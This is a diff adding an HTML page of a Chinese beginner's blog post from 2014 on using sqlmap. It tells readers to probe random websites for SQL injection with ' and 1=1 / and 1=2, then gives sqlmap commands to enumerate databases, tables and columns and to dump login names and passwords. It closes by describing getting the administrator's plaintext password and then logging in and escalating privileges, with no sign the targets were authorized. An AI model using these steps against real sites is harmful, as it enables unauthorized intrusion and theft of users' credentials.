@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>第一次使用 sqlmap | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="kali,SQL 注入," />
+  
+
+  <meta name="description" content="本人菜鸟一枚，第一次使用sqlmap，大神误入准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一次使用 sqlmap">
+<meta property="og:url" content="http://huirong.github.io/2014/09/02/第一次使用sqlmap/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="本人菜鸟一枚，第一次使用sqlmap，大神误入准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902162816652">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902163603858">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902163959578">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902164217546">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902165805211">
+<meta property="og:image" content="http://img.blog.csdn.net/20140902172455071">
+<meta property="og:updated_time" content="2016-04-16T08:01:43.871Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第一次使用 sqlmap">
+<meta name="twitter:description" content="本人菜鸟一枚，第一次使用sqlmap，大神误入准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20140902162816652">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、查看数据库系统信息"><span class="toc-text">I、查看数据库系统信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、查看数据库表"><span class="toc-text">II、查看数据库表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、查看表字段"><span class="toc-text">III、查看表字段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IV、查看数据"><span class="toc-text">IV、查看数据</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-第一次使用sqlmap" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">第一次使用 sqlmap</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2014.09.02</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/SQL-注入/">SQL 注入</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2014/09/02/第一次使用sqlmap/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>本人菜鸟一枚，第一次使用sqlmap，大神误入<br>准备工作：使用 ‘  and 1=1  and 1=2 找到可能存在sql注入的网站<br><a id="more"></a></p>
+<h1 id="I、查看数据库系统信息"><a href="#I、查看数据库系统信息" class="headerlink" title="I、查看数据库系统信息"></a>I、查看数据库系统信息</h1><p>在终端输入<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">u</span> <span class="comment">url</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">dbs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">current</span><span class="literal">-</span><span class="comment">user</span></div></pre></td></tr></table></figure></p>
+<p>说明：url 换成你之前找到的可能存在sql注入的网址 ，文中的url都是这样，不在赘述</p>
+<p><img src="http://img.blog.csdn.net/20140902162816652" alt=""></p>
+<h1 id="II、查看数据库表"><a href="#II、查看数据库表" class="headerlink" title="II、查看数据库表"></a>II、查看数据库表</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u -url <span class="comment">--tables</span></div></pre></td></tr></table></figure>
+<p><img src="http://img.blog.csdn.net/20140902163603858" alt=""></p>
+<p>会出现一个错误，询问是否使用常用的表来 查询数据库表，选择 y<br>sqlmap 会加载常用的数据库表命名字典，使用其中的表名执行sql语句，判断数据库中是否存在相应的表名</p>
+<p><img src="http://img.blog.csdn.net/20140902163959578" alt=""></p>
+<p>输入运行的线程数，这个数字任意</p>
+<p>期间可能会出现请求超时的情况，不用管，sqlmap会自动再次请求，直接等结果<br><img src="http://img.blog.csdn.net/20140902164217546" alt=""></p>
+<p>查询出两张表，可能数据库中不止这两张表</p>
+<h1 id="III、查看表字段"><a href="#III、查看表字段" class="headerlink" title="III、查看表字段"></a>III、查看表字段</h1><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u url -<span class="built_in">T</span> uname --<span class="built_in">columns</span></div></pre></td></tr></table></figure>
+<p>说明：uname是上面查询出来的其中一张表</p>
+<p><img src="http://img.blog.csdn.net/20140902165805211" alt=""></p>
+<h1 id="IV、查看数据"><a href="#IV、查看数据" class="headerlink" title="IV、查看数据"></a>IV、查看数据</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u -url -T uname -C login_name,pass,username <span class="comment">--dump</span></div></pre></td></tr></table></figure>
+<p><img src="http://img.blog.csdn.net/20140902172455071" alt=""></p>
+<p>发现密码竟然是明文，得到管理员账号和密码了。。。。。。。<br>后续就是找后台地址，登录，然后继续提权，就不介绍了</p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2014/09/02/第一次使用sqlmap/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2014/09/02/第一次使用sqlmap/index.html" data-title="第一次使用 sqlmap" data-url="http://huirong.github.io/2014/09/02/第一次使用sqlmap/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
